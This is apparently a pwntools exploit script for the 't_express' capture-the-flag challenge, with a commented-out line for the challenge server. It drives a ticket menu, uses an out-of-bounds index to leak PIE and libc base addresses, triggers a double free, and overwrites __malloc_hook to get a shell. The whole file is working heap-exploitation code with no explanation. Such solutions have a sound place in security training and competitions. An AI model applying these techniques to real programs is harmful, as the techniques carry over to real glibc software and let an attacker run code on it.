from pwn import *
context.log_level = 'debug'

r = process("./t_express")
#r = remote("t-express.sstf.site", 1337)
pause()


def buy(choice, firstname, lastname):
    r.recvuntil("choice: ")
    r.sendline("1")

    r.recvuntil("(1/2): ")
    r.sendline(str(choice))

    r.recvuntil("First name: ")
    r.send(firstname)

    r.recvuntil("Last name: ")
    r.send(lastname)


def view(index):
    r.recvuntil("choice: ")
    r.sendline("2")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))


def use_oneride(index):
    r.recvuntil("choice: ")
    r.sendline("3")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))


def use_oneday(index, choice):
    r.recvuntil("choice: ")
    r.sendline("3")

    r.recvuntil("Index of ticket: ")
    r.sendline(str(index))

    r.recvuntil("(1/2/3/4): ")
    r.sendline(str(choice))


offset_mallochook = 0x1eeb28
offset_onegadget = 0xe6caf

buy(1, "AAAAAAAA", "BBBBBBBB")  # index: 0
buy(2, "A", "B")  # index: 1
buy(1, "A", "B")  # index: 2

use_oneride(2)
use_oneday(1, 1)
use_oneday(1, 1)
use_oneday(1, 1)
use_oneday(1, 2)
use_oneday(1, 3)

# PIE leak
view(1)
r.recvuntil("|name |")
pie = u64(r.recvline()[-9:-3].ljust(8, b"\x00")) - 0x203010  # PIE base
log.info("PIE base: " + hex(pie))

# libc leak
view(-4)
r.recvuntil("|name |")
libc = u64(r.recvline()[-9:-3].ljust(8, b"\x00")) - 0x1ec643  # libc base
log.info("libc base: " + hex(libc))
mallochook = libc + offset_mallochook
onegadget = libc + offset_onegadget

# double free
for i in range(0x20):
    use_oneday(0, 1)
use_oneday(1, 1)

buy(2, p64(mallochook), "B")  # index: 3
buy(1, "/bin/sh", "B")  # index: 4
buy(1, p64(0x55410+libc), "B")  # index: 5

# r.sendline('1')
# r.sendline('1')
r.interactive()
